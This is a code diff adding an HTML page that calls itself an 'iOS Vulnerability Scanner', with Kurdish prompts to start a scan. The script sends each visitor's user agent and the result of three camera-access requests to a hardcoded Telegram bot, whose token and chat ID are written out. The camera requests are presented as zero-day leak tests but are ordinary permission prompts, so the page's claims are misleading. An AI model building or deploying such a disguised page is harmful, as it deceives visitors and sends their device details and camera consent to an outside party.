@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>iPhone Security Lab</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        #log { border: 1px solid #0f0; height: 300px; overflow-y: scroll; padding: 10px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <h2>iOS Vulnerability Scanner v1.0</h2>
+    <p>بۆ دەستپێکردنی تاقیکردنەوە، کلیک لە دوگمەی خوارەوە بکە:</p>
+    <button onclick="runFuzzer()" style="padding: 15px; background: #0f0; color: #000; border: none; cursor: pointer;">START SCAN</button>
+    
+    <div id="log">ئامادەیە بۆ تاقیکردنەوە...</div>
+
+    <script>
+        const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
+        const chat_id = "7261354534";
+
+        function reportToTelegram(msg) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🔍 iPhone Lab: " + msg)}`);
+            document.getElementById('log').innerHTML += "><br>" + msg;
+        }
+
+        async function runFuzzer() {
+            reportToTelegram("Scanning started on: " + navigator.userAgent);
+
+            // تاقیکردنەوەی ١: WebRTC Race Condition
+            try {
+                reportToTelegram("Testing Method 1 (WebRTC Race)...");
+                let stream = await navigator.mediaDevices.getUserMedia({video: true});
+                if (stream) reportToTelegram("✅ SUCCESS: Method 1 found a leak!");
+            } catch(e) { reportToTelegram("❌ Method 1 blocked: " + e.name); }
+
+            // تاقیکردنەوەی ٢: Shadow DOM Injection
+            try {
+                reportToTelegram("Testing Method 2 (Shadow DOM)...");
+                const host = document.createElement('div');
+                const shadow = host.attachShadow({mode: 'closed'});
+                const video = document.createElement('video');
+                shadow.appendChild(video);
+                // تاقیکردنەوەی دەستڕاگەیشتن لە ڕێگەی شادۆوە
+                let stream = await navigator.mediaDevices.getUserMedia({video: true});
+                if (stream) reportToTelegram("✅ SUCCESS: Method 2 leaked via Shadow DOM!");
+            } catch(e) { reportToTelegram("❌ Method 2 blocked."); }
+
+            // تاقیکردنەوەی ٣: Silent Capture during Hash Change
+            try {
+                reportToTelegram("Testing Method 3 (Hash Transition)...");
+                window.location.hash = "exploit_test";
+                let stream = await navigator.mediaDevices.getUserMedia({video: true});
+                if (stream) reportToTelegram("✅ SUCCESS: Method 3 bypassed via Hash!");
+            } catch(e) { reportToTelegram("❌ Method 3 blocked."); }
+
+            reportToTelegram("Scan Complete. No open 0-day found in this session.");
+        }
+    </script>
+</body>
+</html>
